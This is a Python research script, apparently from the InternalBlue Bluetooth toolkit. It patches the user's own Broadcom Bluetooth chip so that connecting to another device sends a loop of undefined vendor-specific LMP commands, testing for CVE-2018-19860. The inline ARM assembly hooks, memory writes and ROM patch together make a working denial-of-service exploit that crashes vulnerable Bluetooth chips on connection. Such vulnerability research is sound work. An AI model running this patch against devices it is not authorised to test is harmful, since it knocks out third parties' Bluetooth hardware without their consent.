#!/usr/bin/python3

# Jiska Classen, Secure Mobile Networking Lab
from pwnlib.asm import asm

from internalblue.adbcore import ADBCore
from internalblue.utils.packing import p32

"""
This is a crash only test for CVE-2018-19860. Install this patch and connect
to any device. If the target device Bluetooth chip crashes upon connection,
it is vulnerable. If not, it is likely not, but to be sure, adapt the value for
`LMP_VSC_CMD_START` and `LMP_VSC_CMD_END`.

This snippet modifies connection establishment. To be still compatible with
scanning for devices, feature_req and name_req should not be modified.
We modify send_LMP_host_connection_req_586E6, which is only triggered when
clicking on another device to establish a connection. Then we launch the attack
that tries vendor specific LMP commands LMP_VSC_ff ... LMP_VSC_00.

TODO
After ~24 commands, this cannot be repeated any more. Tapping again too early
crashes the driver. Long waiting loops don't help. A good workaround is to 
loop from LMP_VSC_0a to LMP VSC 00, which is enough to see if LMP VSC are 
implemented (LMP_VSC_03 will be replied with LMP_VSC_05) and if the device 
is vulnerable (LMP_VSC_0a will not be answered) or not vulnerable (LMP_VSC_0a 
will be replied with LMP_not_accepted).

"""
HOOK_VSC_EXISTS = 0x586E6  # This function is in ROM
ASM_LOCATION_VSC_EXISTS = 0x00211900  # 0xD5900
LMP_VSC_CMD_START = 0x0f #0xcf #0x52 #FIXME change range for LMP crash in case it didn't crash here
LMP_VSC_CMD_END = 0x06
ASM_SNIPPET_VSC_EXISTS = """
b vsc_iterate
b send_lmp

vsc_iterate:
    mov  r5, 0x%02x00   // 4 byte reverse order LMP, starting with LMP VSC 00 ff
    mov  r6, r0             // backup connection struct
    
    loop:
        mov  r0, r6         // restore connection struct
        bl   send_lmp

        subs r5, 0x00000100 // iterate through VSC LMP commands until VSC 00 00
        cmp  r5, 0x%02x00 // loop exit condition
        bne  loop
    
    
    //proceed as in original function send_LMP_host_connection_req_586E6
    mov  r0, r6             // restore connection struct
    mov  r5, 0x00000066     // LMP_host_connection_req << 1
    bl   send_lmp 
    b 0x58760               // address from where send_LMP_host_connection_req_586E6 was called
    
    

//pass connection struct in r0 and lmp data in r5
send_lmp:
    push {r4-r5,lr}

    mov  r4, r0         // store connection struct copy to r4
    
    // malloc buffer for LMP packet
    bl   0x3F17E        // malloc_0x20_bloc_buffer_memzero

    // fill buffer
    str  r5, [r0, 0xc]  // The actual LMP packet must start at offset 0xC in the buffer.
    //// add some more bytes if needed
    mov  r1, 0x4242
    str  r1, [r0, 0xe]
    
    mov  r1, r0         // move lmp packet buffer into r1
    mov  r0, r4         // restore connection struct
    
    pop  {r4-r5,lr}     // restore r4 and the lr
    b    0xf81a         // branch to send_LMP_packet. send_LMP_packet will do the return for us.  
    
""" % (LMP_VSC_CMD_START, LMP_VSC_CMD_END)

"""
When sending LMP commands, lookup tables are used to determine length and other
function parameters. However, as we use undefined commands, some of them seem 
never to be sent. The table lookup simply is nonsense here... so we patch around
this.
"""

ASM_LOCATION_LMP_00_LOOKUP = 0x00211800  # 0xD5700
HOOK_LMP_00_LOOKUP = 0x2008B4  # This function already provides a hook for the LMP handlers
ASM_SNIPPET_LMP_00_LOOKUP = """

    ldr r0, =table
    bx lr


    //dummy table entry
    .align
    table:
    .byte 0x35  //nullsub1+1
    .byte 0xAC 
    .byte 0x00
    .byte 0x00
    .byte 0x10  //length  
    .byte 0x00    
    .byte 0x00
    .byte 0x00

"""


internalblue = ADBCore()
internalblue.interface = internalblue.device_list()[0][1]  # just use the first device

# setup sockets
if not internalblue.connect():
    internalblue.logger.critical("No connection to target device.")
    exit(-1)

progress_log = internalblue.logger.info("installing assembly patches to crash other device on connect requests...")

#progress_log = internalblue.logger.info("Writing ASM snippet for LMP 00 table lookup.")
code = asm(ASM_SNIPPET_LMP_00_LOOKUP, vma=ASM_LOCATION_LMP_00_LOOKUP)
if not internalblue.writeMem(address=ASM_LOCATION_LMP_00_LOOKUP, data=code, progress_log=progress_log):
    internalblue.logger.critical("error!")
    exit(-1)
    
#progress_log = internalblue.logger.info("Installing predefined hook for LMP table lookup.")
if not internalblue.writeMem(address=HOOK_LMP_00_LOOKUP, data=p32(ASM_LOCATION_LMP_00_LOOKUP + 1), progress_log=progress_log):
    internalblue.logger.critical("error!")
    exit(-1)




#progress_log = internalblue.logger.info("Writing ASM snippet for LMP VSC existence check.")
code = asm(ASM_SNIPPET_VSC_EXISTS, vma=ASM_LOCATION_VSC_EXISTS)
if not internalblue.writeMem(address=ASM_LOCATION_VSC_EXISTS, data=code, progress_log=progress_log):
    internalblue.logger.critical("error!")
    exit(-1)
    

# all send_lmp functions are in rom...
#internalblue.logger.info("Installing LMP VSC existence hook patch...")
patch = asm("b 0x%x" % ASM_LOCATION_VSC_EXISTS, vma=HOOK_VSC_EXISTS)
if not internalblue.patchRom(HOOK_VSC_EXISTS, patch):
    internalblue.logger.critical("Installing patch for VSC existence check failed!")
    exit(-1)


internalblue.logger.info("Installed all the hooks. You can now establish connections to other devices to check for the LMP CVE.")

# shutdown connection
internalblue.shutdown()
internalblue.logger.info("------------------")
internalblue.logger.info("To test the vulnerability, establish a classic Bluetooth connection to the target device. Eventually try different values for LMP_VSC_CMD_*.")


